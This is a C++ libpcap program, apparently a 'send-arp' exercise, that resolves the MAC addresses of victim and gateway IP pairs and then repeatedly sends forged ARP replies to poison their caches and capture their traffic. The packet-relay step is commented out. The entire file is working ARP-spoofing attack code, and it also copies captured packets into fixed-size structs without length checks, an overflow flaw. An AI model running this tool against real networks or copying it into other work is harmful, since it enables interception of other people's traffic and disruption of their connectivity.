#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include "mac.h"
#include "linux_kbhit.h"

#define MAC_ALEN 6
#define MAC_ADDR_FMT "%02x:%02x:%02x:%02x:%02x:%02x"
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthIpPacket {
	EthHdr eth_;
	IpHdr ip_;
	uint8_t *tmp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
uint8_t mac_addr[MAC_ALEN];
char ipstr[40];
Mac *st_mac_addr;
int GetInterfaceMacIpAddress(const char *ifname)
{
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd<0) {
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0) {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
	inet_ntop(AF_INET,ifr.ifr_addr.sa_data+2,ipstr,sizeof(struct sockaddr));
    close(sockfd);
}

int main(int argc, char* argv[]) {
	if (argc<4 || argc%2!=0) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    const char *ifname = argv[1];

    if(GetInterfaceMacIpAddress(ifname)==-1) return -1;
	st_mac_addr=(Mac *)malloc(sizeof(Mac)*(argc-2));
	for(int i=1;i<argc/2;i++){
		EthArpPacket request_arp, reply_arp;
		request_arp.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		request_arp.eth_.smac_ = Mac(mac_addr);
		request_arp.eth_.type_ = htons(EthHdr::Arp);

		request_arp.arp_.hrd_ = htons(ArpHdr::ETHER);
		request_arp.arp_.pro_ = htons(EthHdr::Ip4);
		request_arp.arp_.hln_ = Mac::SIZE;
		request_arp.arp_.pln_ = Ip::SIZE;
		request_arp.arp_.op_ = htons(ArpHdr::Request);
		request_arp.arp_.smac_ = Mac(mac_addr);
		request_arp.arp_.sip_ = htonl(Ip(ipstr));
		request_arp.arp_.tmac_ = Mac("00:00:00:00:00:00");
		request_arp.arp_.tip_ = htonl(Ip(argv[i*2]));
		do{
			int res=pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_arp), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			struct pcap_pkthdr* header;
			const u_char* rep_packet;
			EthArpPacket rep_arp;
			res = pcap_next_ex(handle, &header, &rep_packet);
			if(res != 1 || header->caplen < sizeof(EthArpPacket)) continue;
			memcpy(&rep_arp,rep_packet,(size_t)sizeof(EthArpPacket));
			if((rep_arp.arp_.sip_ == request_arp.arp_.tip_) && (rep_arp.arp_.tmac_ == request_arp.arp_.smac_) && (rep_arp.arp_.tip_ == request_arp.arp_.sip_)){
				memcpy(&reply_arp,&rep_arp,(size_t)sizeof(EthArpPacket));
				break;
			}
		}while(true);
		st_mac_addr[i*2-2]=reply_arp.arp_.smac_;

		request_arp.arp_.tip_ = htonl(Ip(argv[i*2+1]));
		do{
			int res=pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_arp), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			struct pcap_pkthdr* header;
			const u_char* rep_packet;
			EthArpPacket rep_arp;
			res = pcap_next_ex(handle, &header, &rep_packet);
			if(res != 1 || header->caplen < sizeof(EthArpPacket)) continue;
			memcpy(&rep_arp,rep_packet,(size_t)sizeof(EthArpPacket));
			if((rep_arp.arp_.sip_ == request_arp.arp_.tip_) && (rep_arp.arp_.tmac_ == request_arp.arp_.smac_) && (rep_arp.arp_.tip_ == request_arp.arp_.sip_)){
				memcpy(&reply_arp,&rep_arp,(size_t)sizeof(EthArpPacket));
				break;
			}
		}while(true);
		st_mac_addr[i*2-1]=reply_arp.arp_.smac_;
	}
	init_keyboard();
    do{
		if(_kbhit()) break;
		printf("arp-spoofing...(press any key to stop)\n");
		struct pcap_pkthdr* header;
		const u_char* rep_packet;
		EthArpPacket attack_arp;
		EthIpPacket sender, target;
		int work_type=0,st_num;
		int res = pcap_next_ex(handle, &header, &rep_packet);
		if(res != 1) continue;
		memcpy(&sender,rep_packet,header->len);
		if(sender.eth_.type_ == htons(EthHdr::Arp)){
			memcpy(&attack_arp,&sender,(size_t)sizeof(EthArpPacket));
			for(int i=1;i<argc/2;i++){
				if((attack_arp.arp_.smac_ == st_mac_addr[i*2-2]) && (attack_arp.arp_.sip_ ==  (Ip)htonl(Ip(argv[i*2]))) && (attack_arp.arp_.tip_ == (Ip)htonl(Ip(argv[i*2+1])))){	
					work_type=1;
					st_num=i;
					break;
				}
			}
			if(work_type==1){
				printf("send arp/////////////////\n");
				attack_arp.eth_.dmac_ = st_mac_addr[st_num*2-2];
				attack_arp.eth_.smac_ = Mac(mac_addr);

				attack_arp.arp_.op_ = htons(ArpHdr::Reply);
				attack_arp.arp_.tmac_ = st_mac_addr[st_num*2-2];
				attack_arp.arp_.smac_ = Mac(mac_addr);
				attack_arp.arp_.sip_ = htonl(Ip(argv[st_num*2+1]));
				attack_arp.arp_.tip_ = htonl(Ip(argv[st_num*2]));
				res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_arp), sizeof(EthArpPacket));
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
				}
				continue;
			}
		}
		if(sender.eth_.type_ == htons(EthHdr::Ip4)){
			for(int i=1;i<argc/2;i++){
				if((sender.eth_.smac_ == st_mac_addr[i*2-2]) && (sender.ip_.sip_ == (Ip)htonl(Ip(argv[i*2])))){
					printf("send ip--------------------\n");
					memcpy(&target,&sender,header->len);
					target.eth_.dmac_ = st_mac_addr[i*2-1];
					target.eth_.smac_ = Mac(mac_addr);
					/*res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&target), sizeof(EthIpPacket));
					if (res != 0) {
						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
					}*/
					break;
				}
			}
		}
	}while(true);

    close_keyboard();
	free(st_mac_addr);
	pcap_close(handle);

	return 0;
}